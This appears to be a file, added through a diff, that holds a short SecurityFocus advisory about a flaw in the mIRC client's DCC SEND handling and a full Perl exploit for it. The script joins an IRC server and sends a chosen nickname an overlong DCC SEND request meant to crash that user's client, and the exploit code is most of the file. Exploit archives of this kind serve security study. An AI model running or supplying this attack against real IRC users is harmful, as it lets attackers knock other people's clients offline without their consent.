@@ -1,0 +1,42 @@
+source: http://www.securityfocus.com/bid/8818/info
+
+A vulnerability has been reported to exist in the mIRC client that may allow a remote attacker to crash a vulnerable mIRC client. The condition is most likely present due to insufficient boundary checking performed on 'DCC SEND' requests.
+
+It has been reported that when received, a malicious 'DDC SEND' request can trigger a fatal error and cause an affected mIRC client to crash. 
+
+#!/usr/bin/perl -w
+use IO::Socket;
+# get irc server to connect to, and nick to exploit.
+print "Enter Serv: "; chomp($serv=<STDIN>);
+print "Enter Nick: "; chomp($nick=<STDIN>);
+
+#setup connection
+$ocket = IO::Socket::INET->new(
+                        PeerAddr=>"$serv",
+			PeerPort=>'6667'
+			) || die "could not connect to $serv: $!";
+
+#$| = 1;
+#$ocket->autoflush();
+$line="";
+until($line =~ /Ident/){
+	$oldline=$line;
+	$line = <$ocket>;
+	if($oldline ne $line) {print $line;}
+}
+
+print $ocket "user ident irc name ircname\n";  #send ident/ircname info
+
+$line="";
+until($line =~/PING/){
+	$oldline=$line;
+	$line = <$ocket>;
+	if ($oldline ne $line) {print $line;}
+}
+
+
+$line =~ s/.*://;
+print $ocket "PONG :$line\n";
+print $ocket "nick thssmnck\n";
+print $ocket "privmsg $nick :DCC SEND \"a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a \" 1079095848 666\n";
+
